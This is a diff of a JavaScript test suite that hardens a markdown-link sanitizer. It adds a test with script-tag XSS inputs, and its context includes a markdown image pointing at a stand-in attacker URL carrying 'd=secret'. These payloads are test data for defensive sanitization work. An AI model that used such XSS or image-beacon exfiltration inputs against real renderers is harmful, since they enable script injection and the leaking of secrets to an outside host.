@@ -216,6 +216,13 @@ describe("stripMarkdownLinks hardening", () => {
         expect(result).toContain("Link");
     });
 
+    it("escapes element-like fragments that survive the transform", () => {
+        const result = stripMarkdownLinks("<script>alert(1)</script>\n- <script src=x\n- a < b");
+        expect(result).not.toContain("<script");
+        expect(result).toContain("alert(1)");
+        expect(result).toContain("a &lt; b");
+    });
+
     it("neutralizes images with multiline destinations", () => {
         const result = stripMarkdownLinks("![pixel](\nhttps://evil.example.com/pixel?d=secret\n)");
         expect(result).not.toMatch(/\]\((?:https?|mailto):/);
